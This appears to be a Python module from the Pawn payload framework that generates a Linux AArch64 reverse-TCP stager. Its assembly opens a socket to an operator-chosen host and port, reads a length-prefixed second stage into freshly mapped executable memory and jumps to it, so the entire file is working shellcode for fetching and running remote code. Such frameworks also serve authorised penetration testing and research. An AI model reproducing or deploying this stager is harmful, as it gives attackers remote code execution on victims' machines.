"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/aarch64/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Arch': "aarch64",
            'Platform': "linux",
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

    def run(self):
        payload = dedent("""\
        start:
            mov x0, 0x2
            mov x1, 0x1
            mov x2, 0
            mov x8, 0xc6
            svc 0
            mov x12, x0

            adr x1, addr
            mov x2, 0x10
            mov x8, 0xcb
            svc 0
        """)

        if self.reliable.value:
            payload += dedent("""\
                cbnz w0, fail
            """)

        payload += dedent("""\
            mov x0, x12
            sub sp, sp, 0x10
            mov x1, sp
            mov x2, 4
            mov x8, 0x3f
            svc 0
        """)

        if self.reliable.value:
            payload += dedent("""\
                cmn x0, 1
                beq fail
            """)

        payload += dedent(f"""\
            ldr w2, [sp, 0]
            lsr x2, x2, 12
            add x2, x2, 1
            lsl x2, x2, 12

            mov x0, xzr
            mov x1, x2
            mov x2, 7
            mov x3, 0x22
            mov x4, xzr
            mov x5, xzr
            mov x8, 0xde
            svc 0
        """)

        if self.reliable.value:
            payload += dedent("""\
                cmn x0, 1
                beq fail
            """)

        payload += dedent("""\
            ldr w4, [sp]
            str x0, [sp]
            mov x3, x0

        read:
            mov x0, x12
            mov x1, x3
            mov x2, x4
            mov x8, 0x3f
            svc 0
        """)

        if self.reliable.value:
            payload += dedent("""\
                cmn x0, 1
                beq fail
            """)

        payload += dedent("""\
            add  x3, x3, x0
            subs x4, x4, x0
            bne read

            ldr x0, [sp]
            blr x0
        """)

        if self.reliable.value:
            payload += dedent("""\
            fail:
                mov x0, 0
                mov x8, 0x5d
                svc 0
            """)

        payload += dedent(f"""\
        addr:
            .short 0x2
            .short 0x{self.port.little.hex()}
            .word 0x{self.host.little.hex()}
        """)

        return self.assemble(
            self.details['Arch'], payload)
